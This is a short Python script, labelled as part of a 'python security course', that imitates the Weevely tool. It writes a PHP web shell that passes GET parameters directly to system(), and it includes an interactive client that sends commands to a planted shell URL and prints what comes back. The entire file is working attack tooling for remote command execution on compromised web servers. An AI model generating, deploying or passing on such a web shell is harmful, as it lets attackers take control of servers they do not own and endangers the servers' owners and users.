from bs4 import BeautifulSoup
import urllib.request
import urllib.parse
import time
from optparse import OptionParser
optparse = OptionParser("""

                          _            
                         | |           
 __      _____  _____   _| | ___ _   _ 
 \ \ /\ / / _ \/ _ \ \ / / |/ _ \ | | |
  \ V  V /  __/  __/\ V /| |  __/ |_| |
   \_/\_/ \___|\___| \_/ |_|\___|\__, |
                                  __/ |
                                 |___/

by abdallah elsokary >>>  python security course
my channel :
https://www.youtube.com/channel/UCpis91Zi0N-CGjqjFXuRt4w
follow me to learn avery thing about information security on my channel
subscribe and share
facebook:
https://www.facebook.com/profile.php?id=100009599018732
ILSW page:
https://www.facebook.com/ILLSW/
security test Group:
https://www.facebook.com/groups/155349421484222/
twitter:
https://twitter.com/abdallahelsoka1
----------------------------------------------------
weevely.py [option]
-u / --url :: shell url
-g / --generate :: shell name
ex:
weevely.py -u http://127.0.0.1/shell.php
weevely.py -d shell
""")

optparse.add_option("-u","--url",dest="shell_url",type="string",help="url plz")
optparse.add_option("-g","--generate",dest="generate",type="string",help="shell file name plz")
(options,args) = optparse.parse_args()
if options.shell_url == None and options.generate == None:
    print(optparse.usage)
    exit(0)
else:
    if options.generate != None and options.shell_url == None:
        shell_name =  str(options.generate)
        shell = shell_name+".php"
        opfile = open(shell,"+w")
        evel_code = """
<?php
$array = array();
foreach($_GET as $value)
{
$event = $value;
array_push($array, $event);
}
echo (system($array[0]." ".$array[1]." ".$array[2]." ".$array[3]." ".$array[4]." ".$array[5]." ".$array[6]));
print_r($array);
?>

"""
        opfile.write(evel_code)
        opfile.close()
        print (shell+" is generated ")
    if options.shell_url != None and options.generate == None:
        url = str(options.shell_url)
        print(""" ex >> [command] space var=[command]:
                  real ex: ipconfig f=> c=ipconfig.txt
                  do not use var (d)
                  exit to close the shell
""")
        while True:
            command = str(input("<shell > "))
            if command == "exit":
                break;
            openurl = urllib.request.urlopen(url+"?d={0}".format(command.replace(" ","&")))
            print(url+"?d={0}".format(command.replace(" ","&")))
            content = str(openurl.read().decode("utf-8")).rstrip("\n")
            soup = BeautifulSoup(content,"html.parser")
            print(soup.get_text())
            
